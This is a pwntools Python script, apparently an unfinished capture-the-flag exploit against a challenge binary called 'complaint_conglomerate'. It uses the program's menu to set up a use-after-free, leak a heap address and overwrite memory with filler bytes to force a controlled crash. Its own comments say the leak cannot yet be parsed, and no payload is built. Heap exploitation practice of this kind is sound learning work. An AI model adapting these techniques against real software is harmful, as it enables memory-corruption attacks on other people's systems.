from pwn import *

# Load Environment
context.terminal = ['tmux','splitw' ,'-h']
elf = ELF("./complaint_conglomerate")
libc = ELF("glibc/libc.so.6")
ld_preload = {"LD_PRELOAD": "glibc/libc.so.6"}


#p = remote("ip", 4444)
#p = process("./complaint_conglomerate")
p = gdb.debug("./complaint_conglomerate", '''
#break *main''')

# Use after free setup
# Pointer 1 Allocate memory
option1 = b"1"
p.sendline(option1)

complaint_id = b"0"
p.sendline(complaint_id)

complaint_type =  b"1"
p.sendline(complaint_type)

complaint = b"A" * 8
p.sendline(complaint)


# free pointer 1 allocated memory
del_complaint = b"2"
p.sendline(del_complaint)

del_id = b"0"
p.sendline(del_id)


# Heap base leak
view_complaint = b"3"
p.sendline(view_complaint)

view_complaint_id = b"0"
p.sendline(view_complaint_id)


# This successfully displays the heap base but cannot recover leak using p.recvline()
#p.clean()
heapBase_leak = p.recvline()
#heapBase_addr = int(heapBase_leak, 16)
print("heap base leak: ", heapBase_leak)
pause()

# malloc pointer 2 points to 1st memory allocated area
option2 = b"1"
p.sendline(option2)

complaint_id2 = b"1"
p.sendline(complaint_id2)

complaint_type2 = b"1"
p.sendline(complaint_type2)

# Overwrite RSP for controlled crash
rsp = b"C" * 8
overwrite  = b"B" * 40 
overwrite += rsp
p.sendline(overwrite)

# Use Pointer 1 & 2 allocated memory
ai_view = b"4"
p.sendline(ai_view)

ai_yes = b"y"
p.sendline(ai_yes)

ai_id = b"0"
p.sendline(ai_id)


exploit = ai_id

pause()
p.sendline(exploit)
p.interactive()
